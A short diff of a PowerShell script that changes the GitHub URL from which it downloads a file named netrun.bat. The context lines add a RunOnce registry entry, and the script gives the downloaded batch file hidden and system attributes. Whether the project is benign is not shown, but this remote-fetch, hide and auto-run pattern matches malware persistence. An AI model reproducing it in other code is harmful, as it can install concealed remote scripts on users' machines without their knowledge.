@@ -5,7 +5,7 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\
 
 if (-not (Test-Path "${_updatePath}\netrun.bat")) {
     Set-Location "${_updatePath}"
-    curl -o netrun.bat "https://raw.githubusercontent.com/Shaymin-HEG-001/Mikroschrott/refs/heads/master/netrun.bat"
+    curl -o netrun.bat "https://raw.githubusercontent.com/ShaymiN64/Mikroschrott/refs/heads/master/netrun.bat"
     Set-ItemProperty -Path "${_updatePath}\netrun.bat" -Name Attributes -Value 6
 }
 
